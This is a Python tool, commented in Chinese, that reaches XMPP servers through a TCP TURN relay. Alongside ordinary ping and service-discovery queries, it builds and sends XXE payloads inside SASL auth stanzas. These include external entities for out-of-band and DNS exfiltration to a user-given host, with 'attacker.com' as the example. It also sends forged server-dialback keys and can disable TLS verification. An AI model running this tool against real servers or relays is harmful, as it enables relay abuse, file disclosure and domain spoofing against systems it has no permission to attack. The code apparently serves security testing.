#!/usr/bin/env python3
"""
XMPP Client via TCP TURN

该脚本参考 `http_turn_client.py` 的结构，通过RFC 6062 TCP TURN中继
与目标XMPP服务器（C2S或S2S端口）建立连接，完成流初始化、可选的
STARTTLS 升级，并支持发送自定义Stanza或XMPP Ping以验证响应。
"""

import argparse
import hashlib
import os
import re
import socket
import ssl
import sys
import time
import uuid

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
TURN_UTILS_DIR = os.path.join(PROJECT_ROOT, "turn_utils")

for path in (PROJECT_ROOT, TURN_UTILS_DIR):
    if path not in sys.path:
        sys.path.insert(0, path)

from turn_utils import (  # noqa: E402
    tcp_connection_bind,
    tcp_send_data,
    resolve_server_address,
    resolve_peer_address,
    tcp_connect,
)
from test_turn_capabilities import allocate_tcp_with_fallback  # noqa: E402
from turn_client import create_permission  # noqa: E402
from config import DEFAULT_TURN_SERVER, DEFAULT_TURN_PORT  # noqa: E402


class XMPPTURNClient:
    def __init__(
        self,
        target_host,
        target_port,
        mode="c2s",
        xmpp_domain=None,
        from_domain=None,
        turn_server=None,
        turn_port=None,
        username=None,
        password=None,
        realm=None,
        use_tls=False,
        starttls=False,
        direct_tls=False,
        verify_xmpp_tls=True,
        xmpp_ssl_context=None,
        read_timeout=15,
        language="en",
        sni_hostname=None,
        xxe_payload=None,
        xxe_oob_url=None,
        xxe_dns_domain=None,
    ):
        self.target_host = target_host
        self.target_port = target_port
        self.mode = mode
        self.xmpp_domain = xmpp_domain or target_host
        self.from_domain = from_domain
        self.turn_server = turn_server or DEFAULT_TURN_SERVER
        self.turn_port = turn_port or DEFAULT_TURN_PORT
        self.username = username
        self.password = password
        self.realm = realm
        self.use_tls = use_tls
        self.starttls = starttls
        self.direct_tls = direct_tls
        self.verify_xmpp_tls = verify_xmpp_tls
        self.xmpp_ssl_context = xmpp_ssl_context
        self.read_timeout = read_timeout
        self.language = language
        self.custom_sni = sni_hostname
        self.xxe_payload = xxe_payload
        self.xxe_oob_url = xxe_oob_url
        self.xxe_dns_domain = xxe_dns_domain

        self.control_sock = None
        self.data_sock = None
        self.connected = False
        self.turn_allocation = None
        self.stream_features = None
        self.latest_response = None
        self.current_stream_id = None
        self.dialback_status = None

    # ------------------------------------------------------------------ #
    # TURN 建连
    # ------------------------------------------------------------------ #
    def connect(self):
        print(f"[+] Connecting to XMPP server {self.target_host}:{self.target_port} via TURN")

        server_address = resolve_server_address(self.turn_server, self.turn_port)
        if not server_address:
            print("[-] Failed to resolve TURN server address")
            return False

        print(f"[+] Using TURN server: {server_address}")

        try:
            allocation_result, is_short_term = allocate_tcp_with_fallback(
                server_address,
                self.username,
                self.password,
                self.realm,
                self.use_tls,
            )
            if not allocation_result:
                print("[-] Failed to allocate TCP TURN relay")
                return False

            (
                self.control_sock,
                nonce,
                realm,
                integrity_key,
                actual_server_address,
                *extra,
            ) = allocation_result
            mi_algorithm = extra[0] if extra else None
            self.turn_allocation = {
                "nonce": nonce,
                "realm": realm,
                "integrity_key": integrity_key,
                "actual_server_address": actual_server_address,
                "mi_algorithm": mi_algorithm,
            }

            if is_short_term:
                print("[+] TCP TURN allocation successful (short-term credential)")
            else:
                print("[+] TCP TURN allocation successful (long-term credential)")

            peer_ip = resolve_peer_address(self.target_host)
            if not peer_ip:
                print(f"[-] Failed to resolve peer {self.target_host}")
                self.control_sock.close()
                return False

            print(f"[+] Resolved peer {self.target_host} to {peer_ip}")

            if not create_permission(
                self.control_sock,
                nonce,
                realm,
                integrity_key,
                peer_ip,
                self.target_port,
                actual_server_address,
                self.username,
                mi_algorithm,
            ):
                print("[-] Failed to create permission")
                self.control_sock.close()
                return False

            print("[+] Permission created")

            connection_id, error_info = tcp_connect(
                self.control_sock,
                nonce,
                realm,
                integrity_key,
                peer_ip,
                self.target_port,
                self.username,
            )
            if not connection_id:
                if error_info:
                    print(f"[-] Failed to initiate TCP connection to peer: {error_info.get('message', 'Unknown error')}")
                else:
                    print("[-] Failed to initiate TCP connection to peer")
                self.control_sock.close()
                return False

            print(f"[+] TURN connection ID: {connection_id}")

            self.data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.data_sock.settimeout(10)
            self.data_sock.connect(actual_server_address)
            print("[+] Data connection established to TURN server")

            if not tcp_connection_bind(
                self.data_sock,
                nonce,
                realm,
                integrity_key,
                connection_id,
                actual_server_address,
                self.username,
            ):
                print("[-] Failed to bind data connection")
                self.data_sock.close()
                self.control_sock.close()
                return False

            print("[+] Data connection bound successfully")
            self.data_sock.settimeout(self.read_timeout)

            if self.direct_tls:
                if not self._wrap_xmpp_socket(context=self.xmpp_ssl_context):
                    return False

            self.connected = True
            return True

        except Exception as exc:
            print(f"[-] Connection failed: {exc}")
            self.disconnect()
            return False

    # ------------------------------------------------------------------ #
    # XMPP 流操作
    # ------------------------------------------------------------------ #
    def open_stream(self, include_declaration=True):
        if not self.connected:
            print("[-] Not connected")
            return None

        stanza = self._build_stream_open(include_declaration)
        if not tcp_send_data(self.data_sock, stanza.encode("utf-8")):
            return None

        print("[+] Stream opening stanza sent, waiting for features...")
        # 如果包含内部内容（如 auth），可能需要等待不同的响应
        keywords = [b"</stream:features>", b"<stream:error", b"</auth>", b"<failure"]
        if self.xxe_payload and "&xxe;" in self.xxe_payload:
            # 如果包含实体引用，也等待可能的响应
            keywords.extend([b"&xxe;", b"XXE", b"ENTITY"])
        response = self._receive_until(
            keywords,
            timeout=self.read_timeout,
        )
        if not response:
            print("[-] No response for stream open")
            return None

        response_text = response.decode("utf-8", errors="ignore")
        self.latest_response = response_text
        self._update_stream_id(response_text)

        if "<stream:error" in response_text:
            print("[!] Received stream error from server")
            print(f"[!] Error response:\n{response_text}")
        else:
            print("[+] Stream features received")
            self.stream_features = response_text

        return response_text

    def negotiate_starttls(self):
        if not self.connected:
            print("[-] Not connected")
            return False

        print("[+] Requesting STARTTLS...")
        starttls_stanza = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        if not tcp_send_data(self.data_sock, starttls_stanza.encode("utf-8")):
            return False

        response = self._receive_until([b"<proceed", b"<failure"], timeout=10)
        if not response:
            print("[-] No STARTTLS response received")
            return False

        text = response.decode("utf-8", errors="ignore")
        print(f"[+] STARTTLS response:\n{text}")
        if "<failure" in text:
            print("[-] STARTTLS failed")
            return False

        if "<proceed" not in text:
            print("[-] STARTTLS proceed tag missing")
            return False

        return self._wrap_xmpp_socket(context=self.xmpp_ssl_context)

    def send_stanza(self, stanza, expect_keywords=None, timeout=None):
        if not self.connected:
            print("[-] Not connected")
            return None

        stanza_data = stanza.strip()
        if not stanza_data.endswith(">"):
            stanza_data += " "

        if not tcp_send_data(self.data_sock, stanza_data.encode("utf-8")):
            return None

        response = self._receive_until(expect_keywords or [], timeout=timeout or self.read_timeout)
        if response:
            text = response.decode("utf-8", errors="ignore")
            self.latest_response = text
            print("[+] Received stanza response:")
            print(text)
            return text

        print("[-] No response for stanza")
        return None

    def send_xxe_stanza(self):
        """在 STARTTLS 完成后的新 stream 中发送包含 XXE 的 auth stanza"""
        if not self.xxe_payload and not self.xxe_oob_url and not self.xxe_dns_domain:
            print("[-] No XXE payload specified")
            return None
        
        if not self.connected:
            print("[-] Not connected")
            return None
        
        # 构建 XXE payload
        dtd_content = ""
        entity_ref = "&xxe;"
        
        if self.xxe_payload:
            # 使用自定义 payload
            dtd_content = self.xxe_payload
        elif self.xxe_oob_url:
            # OOB XXE：通过HTTP请求外带数据
            print(f"[+] Using OOB XXE with URL: {self.xxe_oob_url}")
            dtd_content = f"""<!ENTITY % xxe SYSTEM "{self.xxe_oob_url}">
<!ENTITY xxe2 SYSTEM "{self.xxe_oob_url}">"""
            entity_ref = "&xxe2;"
        elif self.xxe_dns_domain:
            # DNS外带XXE：通过DNS查询外带数据
            print(f"[+] Using DNS OOB XXE with domain: {self.xxe_dns_domain}")
            # 尝试多种方式触发 DNS 查询
            # 方式1：使用参数实体 + 外部实体
            dtd_content = f"""<!ENTITY % xxe SYSTEM "http://{self.xxe_dns_domain}/xxe">
%xxe;
<!ENTITY xxe2 SYSTEM "http://{self.xxe_dns_domain}/xxe2">"""
            entity_ref = "&xxe2;"
        
        # 在 XMPP stream 中，我们需要先关闭当前 stream，然后重新打开包含 DTD 的 stream
        # 先关闭当前 stream
        print("[+] Closing current stream to reopen with XXE DTD...")
        close_stream = "</stream:stream>"
        tcp_send_data(self.data_sock, close_stream.encode("utf-8"))
        
        # 重新打开 stream，这次包含 DTD
        namespace = "jabber:client" if self.mode == "c2s" else "jabber:server"
        attrs = [
            ("to", self.xmpp_domain),
            ("version", "1.0"),
            ("xml:lang", self.language),
            ("xmlns", namespace),
            ("xmlns:stream", "http://etherx.jabber.org/streams"),
        ]
        if self.mode == "s2s" and self.from_domain:
            attrs.insert(0, ("from", self.from_domain))
        
        attr_text = " ".join(f"{key}='{value}'" for key, value in attrs if value)
        
        # 构建包含 DTD 和 auth 元素的 stream opening
        stream_with_xxe = f"""<?xml version='1.0'?>
<!DOCTYPE stream:stream [
{dtd_content}
]>
<stream:stream {attr_text}>
  <auth mechanism='PLAIN' xmlns='urn:ietf:params:xml:ns:xmpp-sasl'>
    {entity_ref}
  </auth>"""
        
        print("[+] Sending stream with XXE payload...")
        if not tcp_send_data(self.data_sock, stream_with_xxe.encode("utf-8")):
            return None
        
        response = self._receive_until(
            [b"</stream:features>", b"<stream:error", b"</auth>", b"<failure", b"<success", b"</stream:stream>", b"XXE", b"TEST"],
            timeout=self.read_timeout,
        )
        if response:
            text = response.decode("utf-8", errors="ignore")
            self.latest_response = text
            print(f"[+] Received response ({len(response)} bytes):")
            print(text)
            
            # 检查是否包含实体内容
            if "XXE_TEST_CONTENT" in text or "XXE" in text:
                print("[!] XXE entity content found in response!")
            elif "not-well-formed" in text:
                print("[!] Server rejected XXE payload (not-well-formed)")
            elif "</stream:stream>" in text and len(text) < 100:
                print("[!] Server closed stream without error (may have accepted format but not processed entity)")
                if self.xxe_oob_url or self.xxe_dns_domain:
                    print(f"[!] Check your DNS log server ({self.xxe_dns_domain or self.xxe_oob_url}) for DNS queries!")
            
            return text
        
        print("[-] No response")
        if self.xxe_oob_url or self.xxe_dns_domain:
            print(f"[!] Check your DNS log server ({self.xxe_dns_domain or self.xxe_oob_url}) for DNS queries!")
        return None

    def send_ping(self, ping_to=None, ping_from=None, iq_id=None):
        iq_id = iq_id or f"turn-ping-{uuid.uuid4().hex[:8]}"
        to_domain = ping_to or self.xmpp_domain
        from_domain = ping_from or self.from_domain or self.xmpp_domain
        ping_stanza = (
            f"<iq from='{from_domain}' to='{to_domain}' type='get' id='{iq_id}'>"
            "<ping xmlns='urn:xmpp:ping'/>"
            "</iq>"
        )
        print(f"[+] Sending XMPP ping (id={iq_id})")
        return self.send_stanza(ping_stanza, expect_keywords=[b"</iq>", b"<stream:error>"])

    def query_server_info(self, query_to=None, query_from=None, iq_id=None):
        """查询服务器信息 (XEP-0030: Service Discovery)"""
        iq_id = iq_id or f"turn-disco-{uuid.uuid4().hex[:8]}"
        to_domain = query_to or self.xmpp_domain
        from_domain = query_from or self.from_domain or self.xmpp_domain
        disco_stanza = (
            f"<iq from='{from_domain}' to='{to_domain}' type='get' id='{iq_id}'>"
            "<query xmlns='http://jabber.org/protocol/disco#info'/>"
            "</iq>"
        )
        print(f"[+] Querying server info via disco#info (id={iq_id})")
        return self.send_stanza(disco_stanza, expect_keywords=[b"</iq>", b"<stream:error>"])

    def perform_dialback(self, secret=None, custom_key=None, timeout=None):
        """执行简单的 dialback result 流程"""
        if self.mode != "s2s":
            print("[-] Dialback 仅在 s2s 模式下可用")
            return None
        if not self.from_domain or not self.xmpp_domain:
            print("[-] Dialback 需要 --from-domain 与 --xmpp-domain")
            return None
        if not self.current_stream_id:
            print("[-] 当前 stream 未提供可用的 ID，无法生成 dialback key")
            return None

        if custom_key:
            dialback_key = custom_key
            print("[+] 使用自定义 dialback key")
        elif secret:
            material = f"{self.current_stream_id} {self.from_domain} {self.xmpp_domain} {secret}"
            dialback_key = hashlib.sha256(material.encode("utf-8")).hexdigest()
            print("[+] 使用 provided secret 生成 dialback key")
        else:
            dialback_key = uuid.uuid4().hex
            print("[!] 未提供 secret，自行生成随机 dialback key（可能被判 invalid）")

        stanza = (
            f"<db:result xmlns:db='jabber:server:dialback' "
            f"from='{self.from_domain}' to='{self.xmpp_domain}'>{dialback_key}</db:result>"
        )
        response = self.send_stanza(
            stanza,
            expect_keywords=[b"</db:result", b"type='valid'", b'type="valid"', b"type='invalid'", b'type="invalid"'],
            timeout=timeout or self.read_timeout,
        )
        status = None
        if response:
            if "type='valid'" in response or 'type="valid"' in response:
                status = "valid"
                print("[+] Dialback result 被接受 (type=valid)")
            elif "type='invalid'" in response or 'type="invalid"' in response:
                status = "invalid"
                print("[-] Dialback result 被拒绝 (type=invalid)")
            else:
                status = "unknown"
                print("[!] Dialback 响应未包含明确结果")
        else:
            print("[-] Dialback 未收到响应")

        self.dialback_status = status
        return {
            "key": dialback_key,
            "response": response,
            "status": status,
        }

    # ------------------------------------------------------------------ #
    # 内部工具
    # ------------------------------------------------------------------ #
    def _wrap_xmpp_socket(self, context=None):
        try:
            if context is None:
                context = ssl.create_default_context()
            if not self.verify_xmpp_tls:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                print("[!] XMPP TLS verification disabled")

            sni = self.custom_sni or self.xmpp_domain or self.target_host
            print(f"[+] Wrapping data socket with TLS (SNI: {sni})")
            self.data_sock = context.wrap_socket(self.data_sock, server_hostname=sni)
            self.data_sock.settimeout(self.read_timeout)
            return True
        except ssl.SSLError as exc:
            print(f"[-] TLS negotiation failed: {exc}")
            self.disconnect()
            return False

    def _build_stream_open(self, include_declaration):
        namespace = "jabber:client" if self.mode == "c2s" else "jabber:server"
        attrs = [
            ("to", self.xmpp_domain),
            ("version", "1.0"),
            ("xml:lang", self.language),
            ("xmlns", namespace),
            ("xmlns:stream", "http://etherx.jabber.org/streams"),
        ]
        if self.mode == "s2s" and self.from_domain:
            attrs.insert(0, ("from", self.from_domain))

        attr_text = " ".join(f"{key}='{value}'" for key, value in attrs if value)
        opening = f"<stream:stream {attr_text}>"
        
        if include_declaration:
            xml_decl = "<?xml version='1.0'?>"
            # 注意：不在初始 stream opening 中包含 XXE，因为服务器会在流协商前断开
            # XXE payload 将在 STARTTLS 完成后的新 stream 中发送
            return xml_decl + "\n" + opening
        return opening

    def _update_stream_id(self, response_text):
        """解析最新 stream 的 id"""
        if not response_text:
            return
        match = re.search(r"id=['\"]([^'\"]+)['\"]", response_text)
        if match:
            self.current_stream_id = match.group(1)
            print(f"[+] 当前 stream id: {self.current_stream_id}")

    def _receive_until(self, keywords=None, timeout=10, max_bytes=65536):
        if not self.data_sock:
            return None

        deadline = time.time() + timeout
        buffer = b""
        keywords = keywords or []

        while time.time() < deadline and len(buffer) < max_bytes:
            try:
                chunk = self.data_sock.recv(4096)
                if not chunk:
                    break
                buffer += chunk
                if any(keyword in buffer for keyword in keywords):
                    break
            except socket.timeout:
                break
            except Exception as exc:
                print(f"[-] Receive error: {exc}")
                break

        if buffer:
            print(f"[+] Received {len(buffer)} bytes from XMPP peer")
        return buffer if buffer else None

    # ------------------------------------------------------------------ #
    # 资源释放
    # ------------------------------------------------------------------ #
    def disconnect(self):
        if self.data_sock:
            try:
                if hasattr(self.data_sock, "unwrap"):
                    try:
                        self.data_sock.unwrap()
                    except ssl.SSLError:
                        pass
                self.data_sock.close()
            except Exception:
                pass
            self.data_sock = None
        if self.control_sock:
            try:
                self.control_sock.close()
            except Exception:
                pass
            self.control_sock = None
        self.connected = False
        print("[+] Disconnected from TURN/XMPP")


def main():
    parser = argparse.ArgumentParser(description="XMPP Client via TCP TURN")
    parser.add_argument("--target-host", required=True, help="XMPP服务器主机名或IP")
    parser.add_argument("--target-port", type=int, help="XMPP服务器端口（默认: C2S=5222, S2S=5269）")
    parser.add_argument("--mode", choices=["c2s", "s2s"], default="c2s", help="通信模式：客户端到服务器或服务器到服务器")
    parser.add_argument("--xmpp-domain", help="XMPP域（stream 'to' 属性）")
    parser.add_argument("--from-domain", help="XMPP 'from' 域（S2S或自定义）")
    parser.add_argument("--language", default="en", help="stream的xml:lang值")
    parser.add_argument("--starttls", action="store_true", help="收到feature后发送STARTTLS握手")
    parser.add_argument("--direct-tls", action="store_true", help="直接在TCP层启用TLS（例如5223）")
    parser.add_argument("--no-verify-xmpp", action="store_true", help="禁用XMPP层TLS证书校验")
    parser.add_argument("--sni-hostname", help="XMPP TLS握手时使用的自定义SNI")
    parser.add_argument("--dialback", action="store_true", help="在S2S模式下发送 db:result 以尝试建立可信域")
    parser.add_argument("--dialback-secret", help="生成 dialback key 使用的 secret（若不提供则使用随机值）")
    parser.add_argument("--dialback-key", help="直接指定 dialback key，优先级高于 secret")

    # TURN配置
    parser.add_argument("--turn-server", help="TURN服务器主机名")
    parser.add_argument("--turn-port", type=int, help="TURN服务器端口")
    parser.add_argument("--username", help="TURN用户名")
    parser.add_argument("--password", help="TURN密码")
    parser.add_argument("--realm", help="TURN认证域")
    parser.add_argument("--tls", action="store_true", help="对TURN控制连接启用TLS")

    # XMPP业务操作
    parser.add_argument("--send-stanza", help="发送自定义的XMPP Stanza（XML字符串）")
    parser.add_argument("--stanza-file", help="从文件加载Stanza发送")
    parser.add_argument("--ping", action="store_true", help="发送XMPP Ping IQ")
    parser.add_argument("--ping-to", help="Ping目标域（默认同xmpp-domain）")
    parser.add_argument("--ping-from", help="Ping来源域（默认from-domain或xmpp-domain）")
    parser.add_argument("--ping-id", help="自定义Ping IQ的ID")
    parser.add_argument("--query-info", action="store_true", help="查询服务器信息（软件名称和版本）")
    parser.add_argument("--xxe-payload", help="注入 XXE payload 到 XML DTD 中（用于测试 XXE 漏洞）")
    parser.add_argument("--xxe-oob-url", help="盲XXE测试：指定外部URL用于OOB数据外带（如 http://attacker.com/xxe）")
    parser.add_argument("--xxe-dns-domain", help="盲XXE测试：指定DNS域名用于DNS外带（如 attacker.com）")

    args = parser.parse_args()

    if not args.target_port:
        args.target_port = 5222 if args.mode == "c2s" else 5269

    if args.direct_tls and args.starttls:
        print("[!] --direct-tls 已启用，忽略 --starttls")
        args.starttls = False

    stanza_payload = None
    if args.send_stanza:
        stanza_payload = args.send_stanza
    elif args.stanza_file:
        try:
            with open(args.stanza_file, "r", encoding="utf-8") as handle:
                stanza_payload = handle.read()
            print(f"[+] Loaded stanza from {args.stanza_file}")
        except OSError as exc:
            print(f"[-] Failed to read stanza file: {exc}")
            return 1

    xmpp_ssl_context = None
    if args.direct_tls:
        xmpp_ssl_context = ssl.create_default_context()
        if args.no_verify_xmpp:
            xmpp_ssl_context.check_hostname = False
            xmpp_ssl_context.verify_mode = ssl.CERT_NONE

    client = XMPPTURNClient(
        target_host=args.target_host,
        target_port=args.target_port,
        mode=args.mode,
        xmpp_domain=args.xmpp_domain,
        from_domain=args.from_domain,
        turn_server=args.turn_server,
        turn_port=args.turn_port,
        username=args.username,
        password=args.password,
        realm=args.realm,
        use_tls=args.tls,
        starttls=args.starttls,
        direct_tls=args.direct_tls,
        verify_xmpp_tls=not args.no_verify_xmpp,
        xmpp_ssl_context=xmpp_ssl_context,
        language=args.language,
        sni_hostname=args.sni_hostname,
        xxe_payload=args.xxe_payload,
        xxe_oob_url=args.xxe_oob_url,
        xxe_dns_domain=args.xxe_dns_domain,
    )

    try:
        if not client.connect():
            return 1

        stream_response = client.open_stream()
        if not stream_response:
            print("[-] Failed to open XMPP stream")
            return 1

        if args.starttls and not client.direct_tls:
            if not client.negotiate_starttls():
                print("[-] STARTTLS negotiation failed")
                return 1
            # STARTTLS 成功后需重新打开流（无需XML声明）
            if not client.open_stream(include_declaration=False):
                print("[-] Failed to reopen stream after STARTTLS")
                return 1
            
            # 如果指定了 XXE payload，在 STARTTLS 完成后的新 stream 中发送
            if args.xxe_payload or args.xxe_oob_url or args.xxe_dns_domain:
                print("[+] Sending XXE payload after STARTTLS...")
                client.send_xxe_stanza()
                return 0

        if args.dialback:
            result = client.perform_dialback(secret=args.dialback_secret, custom_key=args.dialback_key)
            if not result:
                print("[-] Dialback 过程失败")
            elif result.get("status") == "invalid":
                print("[-] Dialback 被判 invalid，后续请求可能仍被拒绝")

        if stanza_payload:
            client.send_stanza(stanza_payload)
        elif args.ping:
            client.send_ping(
                ping_to=args.ping_to,
                ping_from=args.ping_from,
                iq_id=args.ping_id,
            )
        elif args.query_info:
            # 先显示 stream features（可能包含服务器信息）
            if client.stream_features:
                print("\n=== Stream Features ===")
                print(client.stream_features)
            
            response = client.query_server_info()
            if response:
                # 解析服务器信息
                import xml.etree.ElementTree as ET
                try:
                    # 尝试解析 XML 响应
                    root = ET.fromstring(response)
                    # 查找 identity 和 feature 元素
                    identities = root.findall(".//{http://jabber.org/protocol/disco#info}identity")
                    features = root.findall(".//{http://jabber.org/protocol/disco#info}feature")
                    
                    print("\n=== Server Information ===")
                    if identities:
                        for identity in identities:
                            name = identity.get("name", "Unknown")
                            category = identity.get("category", "Unknown")
                            type_attr = identity.get("type", "Unknown")
                            print(f"Name: {name}")
                            print(f"Category: {category}")
                            print(f"Type: {type_attr}")
                    else:
                        print("No identity information found")
                    
                    # 查找软件版本（通常在 identity 的 name 属性中，或通过 XEP-0115）
                    # 某些服务器会在 name 中包含版本号
                    if identities:
                        for identity in identities:
                            name = identity.get("name", "")
                            if "version" in name.lower() or any(char.isdigit() for char in name):
                                print(f"\nSoftware Version (from name): {name}")
                    
                    # 显示支持的 features
                    if features:
                        print(f"\nSupported Features ({len(features)}):")
                        for feature in features[:10]:  # 只显示前10个
                            var = feature.get("var", "")
                            print(f"  - {var}")
                        if len(features) > 10:
                            print(f"  ... and {len(features) - 10} more")
                except ET.ParseError:
                    print("\n=== Server Information (Raw Response) ===")
                    print(response)
        else:
            print("\n=== Stream Features ===")
            if client.stream_features:
                print(client.stream_features)
            else:
                print("<empty>")

    except KeyboardInterrupt:
        print("[+] Interrupted by user")
    finally:
        client.disconnect()

    return 0


if __name__ == "__main__":
    sys.exit(main())

